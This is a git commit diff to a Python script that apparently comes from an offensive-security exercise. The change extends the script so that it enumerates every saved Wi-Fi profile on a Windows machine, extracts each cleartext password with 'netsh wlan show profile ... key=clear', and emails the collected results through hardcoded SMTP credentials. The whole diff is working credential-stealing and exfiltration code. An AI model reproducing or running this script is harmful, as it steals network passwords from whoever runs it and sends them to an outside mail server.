927509f8598addbf1595685ec30a703ef836e358
Robert Paruch <roobbb@live.com>
2020-07-10 20:33:21 -0700

    Update execute_and_reprt.py

--- execute_and_report/execute_and_reprt.py
+++ execute_and_report/execute_and_reprt.py
@@ -4,6 +4,7 @@
 
 import subprocess
 import smtplib
+import re
 
 
 def send_mail(username, password, email, message):
@@ -14,6 +15,14 @@ def send_mail(username, password, email, message):
     server.quit()
 
 
-command = 'netsh wlan show profile ASUS_E8_2G key=clear'
-result = subprocess.check_output(command, shell=True)
+command = 'netsh wlan show profile'
+networks = subprocess.check_output(command, shell=True).decode()
+network_names_list = re.findall('(?:Profile\s*:\s)(.*)', networks)
+
+result = ''
+for network_name in network_names_list:
+    command = f'netsh wlan show profile {network_name} key=clear'
+    current_result = subprocess.check_output(command, shell=True).decode()
+    result += current_result
+
 send_mail('b06ffc432e3884', 'a5e72032e9c491', 'to@smtp.mailtrap.io', result)
